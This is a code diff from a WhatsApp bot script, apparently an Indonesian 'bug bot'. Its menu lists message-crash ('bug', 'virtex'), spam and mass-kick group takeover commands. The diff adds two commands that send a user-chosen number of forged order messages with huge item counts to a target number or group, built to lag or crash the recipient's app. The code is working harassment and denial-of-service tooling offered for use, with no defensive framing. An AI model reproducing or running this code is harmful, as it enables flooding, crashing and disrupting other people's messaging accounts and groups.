@@ -1035,7 +1035,7 @@ var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.f
 "noteMessage": {
 "extendedTextMessage": {
 "requestFrom":`${pushname}`,
-"text": `*[ Bugmenu©️ ]*\n\n1. xenbugv (spam Xenpay)\n2. xenpay\n3. xenpaygc (masukin id grup)\n4. santedgc (masukin id grup)\n5. santed (masukin nomor dan pilih durasi)\n6. xentag (bug Jid)\n7. xendok (bug dokumen)\n8. xendokv1 (documen)\n9. stick (masukin jumlah)\n10. p (bug invit)\n11. xentext (virtex pay)\n12. xentrol (4 troli delay)\n13. xenbutton\n14. xentrolv2 \n\n *[ MENU TAMBAHAN®️ ]*\n1. joinv1 (Masukin link Gc atau id)\n2. joinv2 (Masukin link Gc atau id)\n3. left (masukin id gc)\n4. hackedv1 (semua pesan yang di reply akan di tarik)\n5. hackedv2 (3 stick)\n6. hackedv3\n7. hack1 (despearing)\n8. hack2 (demoteall)\n9. promote\n10. z (hidetag)\n11. kudetav1 (kick all anti ban)\n12. kudetav2 (kick all rawan ban)\n13. tagall\n14. x (hidetag v2)`,
+"text": `*[ Bugmenu©️ ]*\n\n1. xenbugv (spam Xenpay)\n2. xenpay\n3. xenpaygc (masukin id grup)\n4. santedgc (masukin id grup)\n5. santed (masukin nomor dan pilih durasi)\n6. xentag (bug Jid)\n7. xendok (bug dokumen)\n8. xendokv1 (documen)\n9. stick (masukin jumlah)\n10. p (bug invit)\n11. xentext (virtex pay)\n12. xentrol (4 troli delay)\n13. xenbutton\n14. xentrolv2\n15. xentrolv2pc\n16. xentrolv2gc \n\n *[ MENU TAMBAHAN®️ ]*\n1. joinv1 (Masukin link Gc atau id)\n2. joinv2 (Masukin link Gc atau id)\n3. left (masukin id gc)\n4. hackedv1 (semua pesan yang di reply akan di tarik)\n5. hackedv2 (3 stick)\n6. hackedv3\n7. hack1 (despearing)\n8. hack2 (demoteall)\n9. promote\n10. z (hidetag)\n11. kudetav1 (kick all anti ban)\n12. kudetav2 (kick all rawan ban)\n13. tagall\n14. x (hidetag v2)`,
 }
 }}}), { userJid: m.chat, quoted: m })
 xinn.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -1048,6 +1048,54 @@ case 'xenbutton':
                         { buttonId: '#xenpay', buttonText: { displayText: `${virtex(prefix)}` } , type: 1 }
                     ]
                      xinn.sendButtonText(m.chat, buttons, `POWERED BY XINN`, m)
+break
+
+case 'xentrolv2pc': {
+
+num = q.split('|')[0]+'@s.whatsapp.net'
+jumlah = q.split('|')[1]
+for (let i = 0; i < jumlah; i++) {
+var troli = generateWAMessageFromContent(num, proto.Message.fromObject({
+"orderMessage": {
+                  "orderId": "436664297902534",
+                  "sellerJid": "6282143067466@s.whatsapp.net",
+                  "itemCount": 9999999,
+                  "status": "INQUIRY",
+                  "surface": "CATALOG",
+                  "message": ` POWERED BY XINN ${ngazap(prefix)}`,
+                  "orderTitle": "⏤͟͟͞͞ᵡPOWERED BY XINN༗",
+                  "thumbnail": fs.readFileSync("./XeonMedia/virgam.jpeg"),
+                  "token": "AR6ew8v8oH4gt78Ufm/sMBCeaQJwJlDhOTto8qAZytAdQA=="
+}
+}), { userJid: m.chat, quoted: m })
+xinn.relayMessage(num, troli.message, { messageId: troli.key.id })
+}
+reply(`Sukses`)
+break
+
+case 'xentrolv2gc': {
+ 
+const qontol =  reSize(log0, 200, 200)
+if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|spam\nExample : ${command} 62888|1`)
+num = q.split('|')[0]+'@g.us'
+jumlah = q.split('|')[1]
+for (let i = 0; i < jumlah; i++) {
+var troligc = generateWAMessageFromContent(num, proto.Message.fromObject({
+"orderMessage": {
+                  "orderId": "436664297902534",
+                  "sellerJid": "6282143067466@s.whatsapp.net",
+                  "itemCount": 7777777,
+                  "status": "INQUIRY",
+                  "surface": "CATALOG",
+                  "message": `POWERED BY XINN ${ngazap(prefix)}`,
+                  "orderTitle": "⏤͟͟͞͞ᵡPOWERED BY XINN༗",
+                  "thumbnail": fs.readFileSync("./XeonMedia/virgam.jpeg"),
+                  "token": "AR6ew8v8oH4gt78Ufm/sMBCeaQJwJlDhOTto8qAZytAdQA=="
+}
+}), { userJid: m.chat, quoted: m })
+xinn.relayMessage(num, troligc.message, { messageId: troligc.key.id })
+}
+reply(`Sukses`)
 break
 
 case 'xentrolv2': {
